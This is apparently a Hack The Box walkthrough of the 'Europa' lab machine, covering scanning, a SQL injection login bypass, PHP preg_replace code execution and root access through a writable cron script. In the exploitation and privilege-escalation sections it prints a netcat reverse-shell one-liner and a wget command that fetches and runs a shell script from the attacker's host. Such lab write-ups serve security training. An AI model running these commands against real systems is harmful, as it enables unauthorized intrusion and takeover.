![logo](/logo.png)

# [Europa- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 23 Jun 2017 as the eight machine on HTB,Europa created by [ch4p](https://app.hackthebox.com/users/1) without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/europa 10.10.10.22
```

###### Output 

![](/Linux/Linux-Medium/Europa/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/europa 10.10.10.22                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 08:01 EAT
Nmap scan report for 10.10.10.22
Host is up (0.32s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
| tls-alpn: 
|_  http/1.1
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.05 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.18`.  and a bunch of hostnames

port[22]-ssh
port[80]-tcp
port[443]- https

when we naviagate to [http://10.10.10.22](http://10.10.10.22)  we find a page of  Apache

![](/Linux/Linux-Medium/Europa/Screenshots/apache.png)

so looking at the page i think its a misconfigaration of the apache so lets foward this to burpsuite so that we can see the request and also change the hostname to `europacorp.htb`, `www.europacorp.htb`, `admin-portal.europacorp.htb`  when looking at the sites we find the login form  [https://admin-portal.europacorp.htb](https://admin-portal.europacorp.htb)

![](/Linux/Linux-Medium/Europa/Screenshots/admin.png)

lest view the certificate to get other information 

![](/Linux/Linux-Medium/Europa/Screenshots/certificate.png)

we now now that the admin email address is `admin@europacorp.htb` lets open burp and see if we can find some SQl Injection

![](/Linux/Linux-Medium/Europa/Screenshots/burp.png)

upon trying the injection on the email adress and commenting out the password with a comment it lests us in.

![](/Linux/Linux-Medium/Europa/Screenshots/burpin.png)

![](/Linux/Linux-Medium/Europa/Screenshots/dashboard.png)


# Exploitation 

so in tools section we an openvpn generator

![](/Linux/Linux-Medium/Europa/Screenshots/openvpn.png)

so lets send this to burpsuite to analyze it further. Once on the tools page, it appears that it replaces all occurrences of ip_address with a user-specified string. By examining the POST data using Burpsuite, it appears that the regex can be set client-side.

![](/Linux/Linux-Medium/Europa/Screenshots/burpsuite.png)

![](/Linux/Linux-Medium/Europa/Screenshots/burppoc.png)

It can be assumed that the pattern variable is used in preg_replace in the code, which can be
easily exploited. Refer to the linked article [Exploit ](https://www.madirish.net/402) for more information on how this exploit works.

by adding the `/e` modifier and getting the system to do a `whoami` i can see that i can interact with the machine.

![](/Linux/Linux-Medium/Europa/Screenshots/www.png)


so we are going to save this exploit as `shell.php`  then we get it with wget  then run bash against the file but we save it on `tmp`


```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 1337 >/tmp/f
```


```sh
system('wget http://10.10.14.15:8000/shell.php -P /tmp;')
```


```sh
system('bash -f /tmp/shell.php';')
```

![](/Linux/Linux-Medium/Europa/Screenshots/payload.png)


and after running that we get shell

![](Linux/Linux-Medium/Europa/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

![](/Linux/Linux-Medium/Europa/Screenshots/stty.png)

you can get the `user flag`  at 

![](/Linux/Linux-Medium/Europa/Screenshots/useeflag.png)

so lets get `LinEnum` so that we can identify potentila `privsec`  

![](/Linux/Linux-Medium/Europa/Screenshots/LinEnum.png)

it appears that `/var/www/cronjobs/clearlogs` is run every minute

![](/Linux/Linux-Medium/Europa/Screenshots/cronjobs.png)

Examining the clearlogs file shows that `/var/www/cmd/logcleared.sh` is executed by this PHP
script. The `logcleared.sh` file does not exist however, and the directory is writable by `www-data`.

![](/Linux/Linux-Medium/Europa/Screenshots/logsh.png)

so lets creat a revershell used earlier but change the listerner then creat a `logclearned.sh`  to the specified path then we `chmod +x` to make it executable.

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9002 >/tmp/f
```

![](/Linux/Linux-Medium/Europa/Screenshots/privsec.png)

and like that we get root 

![](/Linux/Linux-Medium/Europa/Screenshots/root.png)

and we can get the root flag at 

![](/Linux/Linux-Medium/Europa/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley------------



